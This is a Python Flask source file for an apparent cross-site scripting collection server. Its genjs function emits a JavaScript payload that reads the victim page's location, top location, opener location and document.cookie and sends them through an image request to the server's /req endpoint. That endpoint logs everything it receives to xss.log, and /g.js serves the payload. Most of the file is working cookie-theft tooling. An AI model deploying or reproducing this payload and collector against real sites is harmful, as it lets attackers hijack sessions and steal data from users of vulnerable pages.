from flask import Flask
from flask import request
import logging
import time
from flask import render_template

app = Flask(__name__)
logger = logging.getLogger('mylogger') 
logger.setLevel(logging.DEBUG) 
   
fh = logging.FileHandler('xss.log') 
fh.setLevel(logging.DEBUG) 
   
ch = logging.StreamHandler() 
ch.setLevel(logging.DEBUG) 
   
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s') 
fh.setFormatter(formatter) 
ch.setFormatter(formatter) 
   
logger.addHandler(fh) 
#logger.addHandler(ch) 


def rc4(data, key):
    #if the data is a string, convert to hex format.
    if(type(data) is type("string")):
        tmpData=data
        data=[]
        for tmp in tmpData:
            data.append(ord(tmp))
            
    #if the key is a string, convert to hex format.
    if(type(key) is type("string")):
        tmpKey=key
        key=[]
        for tmp in tmpKey:
            key.append(ord(tmp))
            
    #the Key-Scheduling Algorithm
    x = 0
    box= list(range(256))
    for i in range(256):
        x = (x + box[i] + key[i % len(key)]) % 256
        box[i], box[x] = box[x], box[i]
        
    #the Pseudo-Random Generation Algorithm
    x = 0
    y = 0
    out = []
    for c in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(c ^ box[(box[x] + box[y]) % 256])
 
    result=""
    printable=True
    for tmp in out:
        if(tmp<0x21 or tmp>0x7e):
            # there is non-printable character
            printable=False
            break
        result += chr(tmp)
        
    if(printable==False):
        result=""
        #convert to hex string   
        for tmp in out:
            result += "{0:02X}".format(tmp)
        
    return result

def genjs(url,id):
	src='''
		(function(){(new Image()).src='%s?do=api&id=%s&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})()
	''' % (url,id)

	return src.strip()
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/g.js')
def gjs():
    id = rc4('%s' % time.clock(), 'key').upper()[0:8]
    return genjs('http://127.0.0.1/req', id)



@app.route('/req', methods=['GET', 'POST'])
def req():
    val = ""
    for key in request.args:
        val += ',%s:%s' % (key,request.args.get(key,'').decode('utf8'))
    logger.info(val)
    return val

if __name__ == '__main__':
    app.debug=True
    app.run(host='127.0.0.1',port=80)